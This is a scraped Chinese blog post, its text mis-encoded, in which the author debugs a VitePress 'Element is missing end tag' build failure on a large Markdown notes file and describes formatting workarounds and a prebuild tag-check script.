    <span class="hljs-keyword">for</span>(s <span class="hljs-keyword">in</span> count) {
        <span class="hljs-built_in">printf</span> <span class="hljs-string">"%-12s %6d  %s\n"</span>, s, count[s], states[s]
    }
}<span class="hljs-string">'\'</span><span class="hljs-string">' | sort
'</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VitePressæ–‡ä»¶æ„å»ºå¤±è´¥:Element is missing end tag?]]></title>    <link>https://juejin.cn/post/7592637149697130531</link>    <guid>https://juejin.cn/post/7592637149697130531</guid>    <pubDate>2026-01-08T09:45:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592637149697130531" data-draft-id="7592593491861782528" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VitePressæ–‡ä»¶æ„å»ºå¤±è´¥:Element is missing end tag?"/> <meta itemprop="keywords" content="VitePress"/> <meta itemprop="datePublished" content="2026-01-08T09:45:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jaxon1216"/> <meta itemprop="url" content="https://juejin.cn/user/2446894137877289"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VitePressæ–‡ä»¶æ„å»ºå¤±è´¥:Element is missing end tag?
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2446894137877289/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jaxon1216
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:45:37.000Z" title="Thu Jan 08 2026 09:45:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">VitePress å¤§å‹ Markdown æ–‡ä»¶æ„å»ºå¤±è´¥é—®é¢˜ï¼šElement is missing end tag</h2>
<p>æ˜¨æ™šåœ¨æˆ‘ push å®Œä¸Šä¸€æ¬¡çš„ Vue å­¦ä¹ ç¬”è®°åï¼Œä¹ æƒ¯æ€§åœ°æ‰“å¼€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fnotes.jiangxu.net" target="_blank" title="https://notes.jiangxu.net" ref="nofollow noopener noreferrer">notes.jiangxu.net</a> æŸ¥çœ‹æ›´æ–°ã€‚ç„¶è€Œé¡µé¢å¹¶æ²¡æœ‰å¦‚æœŸæ›´æ–°ã€‚å¿ƒé‡Œä¸€æ²‰ï¼Œæ‰“å¼€ GitHub ä»“åº“ï¼Œæœç„¶çœ‹åˆ°äº†é‚£ä¸ªåˆºçœ¼çš„çº¢è‰² âŒ â€”â€” éƒ¨ç½²å¤±è´¥ã€‚</p>
<p>åˆ‡æ¢åˆ° Vercel çš„éƒ¨ç½²æ—¥å¿—ï¼Œæ˜ å…¥çœ¼å¸˜çš„æ˜¯è¿™æ ·çš„é”™è¯¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">âœ– building client + server bundles...

build error:!
[vite:vue] [plugin vite:vue] Frontend/Vue/day2-night.md (273:1): 
Element is missing end tag.

SyntaxError: [plugin vite:vue] Frontend/Vue/day2-night.md (273:1): 
Element is missing end tag.
    at createCompilerError (compiler-core.cjs.prod.js:1360:17)
    at emitError (compiler-core.cjs.prod.js:2963:5)
    at Object.onclosetag (compiler-core.cjs.prod.js:2360:13)
</code></pre>
<p>"Element is missing end tag"ï¼Ÿæˆ‘ä»”ç»†æ£€æŸ¥äº†ç¬¬ 273 è¡Œï¼Œæ˜¯ä¸€ä¸ªæ™®é€šçš„ Markdown è¡¨æ ¼ï¼Œæ²¡æœ‰ä»»ä½• HTML æ ‡ç­¾ã€‚è¿™è®©æˆ‘é™·å…¥äº†å›°æƒ‘ã€‚</p>
<h3 data-id="heading-1">ğŸ” æ¼«é•¿çš„è°ƒè¯•ä¹‹æ—…</h3>
<p>æ¥ä¸‹æ¥çš„ä¸€ä¸ªä¸ªå°æ—¶ï¼Œæˆ‘ä¸ Claude Sonnet è¿›è¡Œäº†å¤šè½®å¯¹è¯ï¼Œå°è¯•äº†å„ç§å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼š</p>
<ol>
<li><strong>éªŒè¯ HTML æ ‡ç­¾é…å¯¹</strong> - å†™äº†è„šæœ¬æ£€æŸ¥æ‰€æœ‰ <code>&lt;details&gt;</code>ã€<code>&lt;summary&gt;</code> æ ‡ç­¾ï¼Œç»“æœå…¨éƒ¨é…å¯¹æ­£ç¡® âœ…</li>
<li><strong>æ£€æŸ¥ä»£ç å—é—­åˆ</strong> - éªŒè¯äº†æ‰€æœ‰ 44 ä¸ªä»£ç å—éƒ½æ­£ç¡®é—­åˆ âœ…</li>
<li><strong>è½¬ä¹‰ HTML æ ‡ç­¾</strong> - å°†æ‰€æœ‰ <code>&lt;script setup&gt;</code> æ”¹ä¸º <code>&amp;lt;script setup&amp;gt;</code> âœ…</li>
<li><strong>ä¿®å¤è¡¨æ ¼æ ¼å¼</strong> - å°†åŒç«–çº¿ <code>||</code> å¼€å¤´çš„è¡¨æ ¼æ”¹ä¸ºå•ç«–çº¿ <code>|</code> âœ…</li>
<li><strong>æ›´æ¢ä»£ç å—ç±»å‹</strong> - å°† <code>vue</code> æ”¹ä¸º <code>html</code> âœ…</li>
</ol>
<p>ä½†é—®é¢˜ä¾ç„¶å­˜åœ¨ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef3f3c68317e45d69f0fec02e950f88c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF4b24xMjE2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768470337&amp;x-signature=qpJiV2wY2mn%2F9eoQwZe6TwBppCg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æ›´è¯¡å¼‚çš„æ˜¯ï¼š</p>
<ul>
<li>åˆ é™¤"é—®é¢˜è¡Œ"åï¼Œé”™è¯¯ä¼šç§»åŠ¨åˆ°æ›´å‰é¢çš„è¡Œï¼ˆ273â†’242â†’191ï¼‰</li>
<li>å‰ 272 è¡Œå•ç‹¬æå–å‡ºæ¥å¯ä»¥æˆåŠŸæ„å»º</li>
<li>åŒç›®å½•ä¸‹å…¶ä»–è¾ƒå°çš„æ–‡ä»¶éƒ½èƒ½æ­£å¸¸æ„å»º</li>
</ul>
<h3 data-id="heading-2">ğŸ’¡ çœŸç›¸å¤§ç™½</h3>
<p>ç»è¿‡ 200 å¤šæ¬¡å·¥å…·è°ƒç”¨åï¼Œé—®é¢˜ä¾ç„¶æ²¡æœ‰å¾—åˆ°è§£å†³ã€‚æœ€ç»ˆæˆ‘è¯·æ•™äº†è€å¤§ï¼Œä»–ä¸€çœ¼å°±çœ‹å‡ºäº†é—®é¢˜æ‰€åœ¨ã€‚åŸæ¥ï¼Œè¿™æ˜¯ <strong>VitePress/Vue ç¼–è¯‘å™¨åœ¨å¤„ç†å¤æ‚ Markdown æ–‡ä»¶æ—¶çš„è¾¹ç•Œæƒ…å†µ Bug</strong>ã€‚</p>
<h4 data-id="heading-3">ç¯å¢ƒä¿¡æ¯</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"vitepress"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^1.6.4"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"@vitejs/plugin-vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.x"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.x"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-4">æ–‡ä»¶å¯¹æ¯”åˆ†æ</h4>





































<table><thead><tr><th>æ–‡ä»¶</th><th>è¡Œæ•°</th><th><code>&lt;details&gt;</code></th><th>è¡¨æ ¼</th><th>ä»£ç å—</th><th>æ„å»ºç»“æœ</th></tr></thead><tbody><tr><td>day2-morning.md</td><td>418</td><td>0</td><td>0</td><td>9</td><td>âœ… æˆåŠŸ</td></tr><tr><td>day2-afternoon.md</td><td>304</td><td>5</td><td>0</td><td>2</td><td>âœ… æˆåŠŸ</td></tr><tr><td>day2-night.md</td><td>1580</td><td>22</td><td>55è¡Œ</td><td>32</td><td>âŒ å¤±è´¥</td></tr></tbody></table>
<p>é€šè¿‡å¯¹æ¯”å‘ç°ï¼Œå¤±è´¥çš„æ–‡ä»¶å…·æœ‰ä¸‰ä¸ªç‰¹å¾ï¼š</p>
<ol>
<li><strong>æ–‡ä»¶æœ€å¤§</strong>ï¼ˆ1580 è¡Œï¼‰</li>
<li><strong>HTML æ ‡ç­¾æœ€å¤š</strong>ï¼ˆ22 ä¸ª <code>&lt;details&gt;</code>ï¼‰</li>
<li><strong>å¤æ‚åº¦æœ€é«˜</strong>ï¼ˆè¡¨æ ¼ + ä»£ç å— + HTML æ ‡ç­¾æ··åˆï¼‰</li>
</ol>
<h4 data-id="heading-5">äºŒåˆ†æ³•æµ‹è¯•</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æµ‹è¯•å‰ 800 è¡Œ</span>
âœ… æ„å»ºæˆåŠŸ

<span class="hljs-comment"># æµ‹è¯•å‰ 1200 è¡Œ  </span>
âŒ æ„å»ºå¤±è´¥

<span class="hljs-comment"># æµ‹è¯•å‰ 1000 è¡Œ</span>
âœ… æ„å»ºæˆåŠŸ
</code></pre>
<p><strong>ç»“è®º</strong>ï¼šå­˜åœ¨ä¸€ä¸ªéšè—çš„é˜ˆå€¼ï¼ˆçº¦ 1000-1200 è¡Œï¼‰ï¼Œè¶…è¿‡åè§¦å‘ Bugã€‚</p>
<h3 data-id="heading-6">ğŸ¯ æ ¹æœ¬åŸå› </h3>
<p>è¿™ä¸æ˜¯æŸä¸€è¡Œçš„è¯­æ³•é”™è¯¯ï¼Œè€Œæ˜¯<strong>å¤šä¸ªè¾¹ç•Œæƒ…å†µçš„ç´¯ç§¯æ•ˆåº”</strong>ï¼š</p>
<h4 data-id="heading-7">åŸå›  1ï¼šè¡¨æ ¼ä¸­çš„èŠ±æ‹¬å·è¢«è¯¯è¯†åˆ«</h4>
<p>åœ¨ Markdown è¡¨æ ¼ä¸­ä½¿ç”¨ <code>return {}</code>ï¼ŒVue ç¼–è¯‘å™¨å¯èƒ½å°†å…¶è¯¯è®¤ä¸ºæ¨¡æ¿æ’å€¼è¯­æ³• <code>{{ }}</code>ã€‚åœ¨å¤§æ–‡ä»¶ä¸­ï¼Œè¿™ç§è¯¯è¯†åˆ«ä¼šç´¯ç§¯ï¼Œå¯¼è‡´ç¼–è¯‘å™¨çŠ¶æ€æœºé”™ä¹±ã€‚</p>
<p><strong>é—®é¢˜ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">| **æš´éœ²** | è‡ªåŠ¨æš´éœ² | éœ€è¦ `<span class="hljs-keyword">return</span> {}` |
</code></pre>
<h4 data-id="heading-8">åŸå›  2ï¼š<code>&lt;summary&gt;</code> æ ‡ç­¾å†…çš„è½¬ä¹‰ HTML</h4>
<p>åœ¨ <code>&lt;summary&gt;</code> æ ‡ç­¾å†…ç›´æ¥ä½¿ç”¨ <code>&amp;lt;script setup&amp;gt;</code> è¿™æ ·çš„è½¬ä¹‰å­—ç¬¦ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ä¼šè®©ç¼–è¯‘å™¨æ··æ·†ï¼Œè®¤ä¸ºè¿˜æœ‰æœªé—­åˆçš„æ ‡ç­¾ã€‚</p>
<h4 data-id="heading-9">åŸå›  3ï¼š<code>&lt;details&gt;</code> å†…éƒ¨æ ¼å¼ä¸è§„èŒƒ</h4>
<p>VitePress çš„ Markdown è§£æå™¨æœŸæœ› <code>&lt;summary&gt;</code> æ ‡ç­¾åæœ‰ç©ºè¡Œï¼Œå¦åˆ™åœ¨å¤§æ–‡ä»¶ä¸­å¯èƒ½å¯¼è‡´è§£æè¾¹ç•Œä¸æ¸…ã€‚</p>
<h4 data-id="heading-10">è§¦å‘æ¡ä»¶</h4>
<p>å½“ä»¥ä¸‹å› ç´ <strong>åŒæ—¶å‡ºç°</strong>æ—¶è§¦å‘ Bugï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">æ–‡ä»¶å¤§å° &gt; 1000è¡Œ 
<span class="hljs-bullet">  +</span> HTMLæ ‡ç­¾æ•°é‡ &gt; 20
<span class="hljs-bullet">  +</span> Markdownè¡¨æ ¼ &gt; 10
<span class="hljs-bullet">  +</span> èŠ±æ‹¬å·{} åœ¨è¡¨æ ¼ä¸­
  = ç¼–è¯‘å™¨è¿›å…¥ä¸ç¨³å®šçŠ¶æ€
</code></pre>
<p>è¿™æ˜¯å…¸å‹çš„<strong>ç¼–è¯‘å™¨è¾¹ç•Œæƒ…å†µ Bug</strong>ï¼Œä¸æ˜¯ä»£ç é”™è¯¯ï¼Œè€Œæ˜¯å·¥å…·é“¾çš„ç¼ºé™·ã€‚</p>
<h3 data-id="heading-11">âœ… è§£å†³æ–¹æ¡ˆ-workout</h3>
<h4 data-id="heading-12">ä¿®å¤ 1ï¼šè¡¨æ ¼ä¸­çš„èŠ±æ‹¬å·åŠ ç©ºæ ¼</h4>
<p><strong>ä¿®æ”¹å‰</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">| <span class="hljs-strong">**æš´éœ²**</span> | è‡ªåŠ¨æš´éœ² | éœ€è¦ <span class="hljs-code">`return {}`</span> |
</code></pre>
<p><strong>ä¿®æ”¹å</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">| <span class="hljs-strong">**æš´éœ²**</span> | è‡ªåŠ¨æš´éœ² | éœ€è¦ <span class="hljs-code">`return { }`</span> |
</code></pre>
<p>åœ¨ <code>{}</code> ä¹‹é—´æ·»åŠ ç©ºæ ¼ï¼Œé¿å…è¢«è¯¯è¯†åˆ«ä¸º Vue æ’å€¼ã€‚</p>
<h4 data-id="heading-13">ä¿®å¤ 2ï¼šè§„èŒƒ <code>&lt;details&gt;</code> æ ¼å¼</h4>
<p>åœ¨ä»¥ä¸‹ä½ç½®æ·»åŠ ç©ºè¡Œï¼š</p>
<ul>
<li><code>&lt;summary&gt;</code> æ ‡ç­¾å</li>
<li>ä»£ç å—å‰å</li>
<li><code>&lt;/details&gt;</code> æ ‡ç­¾å‰</li>
</ul>
<p>è®© Markdown è§£æå™¨æ›´æ¸…æ™°åœ°è¯†åˆ«è¾¹ç•Œã€‚</p>
<h4 data-id="heading-14">ä¿®å¤ 3ï¼šä¼˜åŒ– <code>&lt;summary&gt;</code> å†…çš„ HTML</h4>
<p>ä½¿ç”¨ <code>&lt;code&gt;</code> æ ‡ç­¾åŒ…è£¹è½¬ä¹‰å­—ç¬¦ï¼š</p>
<p><strong>ä¿®æ”¹å‰</strong>ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">summary</span>&gt;</span>ä¸ºä»€ä¹ˆ <span class="hljs-symbol">&amp;lt;</span>script setup<span class="hljs-symbol">&amp;gt;</span> ä¸èƒ½ç”¨ï¼Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span>
</code></pre>
<p><strong>ä¿®æ”¹å</strong>ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">summary</span>&gt;</span>ä¸ºä»€ä¹ˆ <span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;lt;</span>script setup<span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span> ä¸èƒ½ç”¨ï¼Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span>
</code></pre>
<h4 data-id="heading-15">ä¿®å¤ 4ï¼šæ‹†åˆ†å¤§æ–‡ä»¶ï¼ˆæ²»æœ¬æ–¹æ¡ˆï¼‰</h4>
<p>å¦‚æœæ–‡ä»¶è¶…è¿‡ 800 è¡Œï¼Œå»ºè®®æ‹†åˆ†ä¸ºå¤šä¸ªå­æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">day2-night<span class="hljs-selector-class">.md</span> (<span class="hljs-number">1580</span>è¡Œ)
  â†“ æ‹†åˆ†ä¸º
day2-night-pinia<span class="hljs-selector-class">.md</span> (<span class="hljs-number">800</span>è¡Œ)
day2-night-communication<span class="hljs-selector-class">.md</span> (<span class="hljs-number">780</span>è¡Œ)
</code></pre>
<h3 data-id="heading-16">ğŸ”§ é¢„é˜²æªæ–½ï¼šè‡ªåŠ¨åŒ–æ£€æŸ¥</h3>
<p>ä¸ºé¿å…ç±»ä¼¼é—®é¢˜ï¼Œæ·»åŠ é¢„æ„å»ºæ£€æŸ¥è„šæœ¬ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// scripts/check-html-tags.cjs</span>
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params">filePath</span>) {
  <span class="hljs-keyword">const</span> content = fs.<span class="hljs-title function_">readFileSync</span>(filePath, <span class="hljs-string">'utf-8'</span>);
  <span class="hljs-keyword">const</span> lines = content.<span class="hljs-title function_">split</span>(<span class="hljs-string">'\n'</span>);
  
  <span class="hljs-keyword">let</span> inCodeBlock = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">const</span> tagStack = [];
  
  lines.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">line, index</span>) =&gt;</span> {
    <span class="hljs-comment">// è·³è¿‡ä»£ç å—</span>
    <span class="hljs-keyword">if</span> (line.<span class="hljs-title function_">trim</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'```'</span>)) {
      inCodeBlock = !inCodeBlock;
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (inCodeBlock) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// ç§»é™¤åå¼•å·å†…å®¹</span>
    <span class="hljs-keyword">const</span> processedLine = line.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/`[^`]*`/g</span>, <span class="hljs-string">''</span>);
    
    <span class="hljs-comment">// æ£€æŸ¥æ ‡ç­¾é…å¯¹...</span>
  });
  
  <span class="hljs-keyword">return</span> tagStack.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>;
}
</code></pre>
<p>åœ¨ <code>package.json</code> ä¸­é…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"check:html"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node scripts/check-html-tags.cjs"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"prebuild"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npm run check:html"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-17">ğŸ“Š ä¿®å¤æ•ˆæœ</h3>

























<table><thead><tr><th>æŒ‡æ ‡</th><th>ä¿®å¤å‰</th><th>ä¿®å¤å</th></tr></thead><tbody><tr><td>æœ¬åœ°æ„å»º</td><td>âŒ å¤±è´¥</td><td>âœ… 45s</td></tr><tr><td>Vercel éƒ¨ç½²</td><td>âŒ å¤±è´¥</td><td>âœ… ~60s</td></tr><tr><td>æ–‡ä»¶å¤§å°</td><td>1580è¡Œ</td><td>1580è¡Œï¼ˆå†…å®¹ä¸å˜ï¼‰</td></tr></tbody></table>
<p>ä¿®å¤å‰åæ–‡ä»¶è¡Œæ•°ä¸å˜ï¼Œåªæ˜¯è°ƒæ•´äº†æ ¼å¼ã€‚</p>
<h3 data-id="heading-18">ğŸ’¡ æœ€ä½³å®è·µå»ºè®®</h3>
<h4 data-id="heading-19">æ–‡ä»¶å¤§å°æ§åˆ¶</h4>
<ul>
<li>âœ… <strong>æ¨è</strong>ï¼šå•ä¸ª Markdown æ–‡ä»¶ä¸è¶…è¿‡ 800 è¡Œ</li>
<li>âš ï¸ <strong>è­¦å‘Š</strong>ï¼šè¶…è¿‡ 1000 è¡Œéœ€è¦ç‰¹åˆ«æ³¨æ„æ ¼å¼è§„èŒƒ</li>
<li>âŒ <strong>é¿å…</strong>ï¼šè¶…è¿‡ 1500 è¡Œï¼Œå¼ºçƒˆå»ºè®®æ‹†åˆ†</li>
</ul>
<h4 data-id="heading-20">æ ¼å¼è§„èŒƒ</h4>
<p><strong>âœ… æ¨èå†™æ³•</strong>ï¼š</p>
<ol>
<li><strong>è¡¨æ ¼ä¸­çš„èŠ±æ‹¬å·</strong>ï¼š<code>return { value }</code> ï¼ˆæœ‰ç©ºæ ¼ï¼‰</li>
<li><strong>details æ ‡ç­¾</strong>ï¼šsummary åã€å†…å®¹å‰åã€ä»£ç å—å‰åéƒ½è¦æœ‰ç©ºè¡Œ</li>
<li><strong>summary ä¸­çš„ HTML</strong>ï¼šç”¨ <code>&lt;code&gt;</code> æ ‡ç­¾åŒ…è£¹ï¼Œå¦‚ <code>&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;</code></li>
</ol>
<p><strong>âŒ é¿å…å†™æ³•</strong>ï¼š</p>
<ol>
<li><strong>è¡¨æ ¼ä¸­ç´§å¯†çš„èŠ±æ‹¬å·</strong>ï¼š<code>return {}</code> ï¼ˆæ— ç©ºæ ¼ï¼‰</li>
<li><strong>details æ— ç©ºè¡Œ</strong>ï¼šsummary åç›´æ¥å†™å†…å®¹</li>
<li><strong>summary ä¸­ç›´æ¥è½¬ä¹‰</strong>ï¼šç›´æ¥ä½¿ç”¨ <code>&amp;lt;</code> <code>&amp;gt;</code> ä¸ç”¨ code åŒ…è£¹</li>
</ol>
<h4 data-id="heading-21">æ··åˆå†…å®¹æ³¨æ„äº‹é¡¹</h4>
<p>å½“æ–‡ä»¶ä¸­åŒæ—¶åŒ…å«ä»¥ä¸‹å…ƒç´ æ—¶ï¼Œéœ€è¦æ ¼å¤–å°å¿ƒï¼š</p>
<ul>
<li>å¤§é‡ Markdown è¡¨æ ¼ï¼ˆ&gt; 10 è¡Œï¼‰</li>
<li>å¤šä¸ª HTML æ ‡ç­¾ï¼ˆ&gt; 15 ä¸ªï¼‰</li>
<li>å¤šä¸ªä»£ç å—ï¼ˆ&gt; 20 ä¸ªï¼‰</li>
<li>åå¼•å·å†…çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆ<code>{}</code>ã€<code>&lt;&gt;</code>ï¼‰</li>
</ul>
<h3 data-id="heading-22">ğŸ¯ ç»éªŒæ€»ç»“</h3>
<h4 data-id="heading-23">å…³é”®è¦ç‚¹</h4>
<ol>
<li>
<p><strong>å·¥å…·é“¾ä¸æ˜¯å®Œç¾çš„</strong></p>
<ul>
<li>VitePress/Vue ç¼–è¯‘å™¨åœ¨å¤„ç†è¾¹ç•Œæƒ…å†µæ—¶å¯èƒ½å‡ºç° Bug</li>
<li>ä¸è¦å‡è®¾å·¥å…·ä¼šæ­£ç¡®å¤„ç†æ‰€æœ‰åˆæ³•çš„ Markdown è¯­æ³•</li>
</ul>
</li>
<li>
<p><strong>ç´¯ç§¯æ•ˆåº”å¾ˆé‡è¦</strong></p>
<ul>
